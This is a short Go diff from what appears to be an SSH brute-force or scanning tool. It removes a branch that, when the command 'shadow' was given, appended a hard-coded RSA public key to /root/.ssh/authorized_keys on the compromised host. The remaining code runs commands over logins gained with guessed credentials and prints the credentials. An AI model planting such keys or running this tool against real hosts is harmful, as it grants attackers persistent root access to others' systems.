@@ -74,9 +74,6 @@ func SshConn(info *common.HostInfo, user string, pass string) (flag bool, err er
 			flag = true
 			var result string
 			if info.Command != "" {
-				if info.Command == "shadow" {
-					info.Command = "mkdir dir /root/.ssh/ && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkQQuWtmLm0eEhogGubMFh2/qv21aQV1tzbRjySPNQJRig479hMre48jxWDzB71WdEU2vg+ns8/0s3jqcGAx5lJaneH1ovLRNdIq4PkfmJPSMCEibGoNVS47rvfrv4QgECnbAt3azklnvniDvZiP5KjBQS9z57Ni2WVDC1SHNy1PDVMGYMJxZZ8kVKP7LRDbiOKJsSplHV/qP3NGZkdKh7OUYBx8A7+S3vT9c3AMSmk74Z2ibU0sddlngf0hLOxbTRiJV+OsgQQOfnttZvA7LoxbCiMtpzKGLOLAHXD8Hx5okXkx8cGOjc+Fcr6s2eQ10BLGPO4LPYWQ+G91xj+VF7 sysadmin\">> /root/.ssh/authorized_keys"
-				}
 				combo, _ := session.CombinedOutput(info.Command)
 				result = fmt.Sprintf("[+] SSH:%v:%v:%v %v \n %v", Host, Port, Username, Password, string(combo))
 				if info.SshKey != "" {
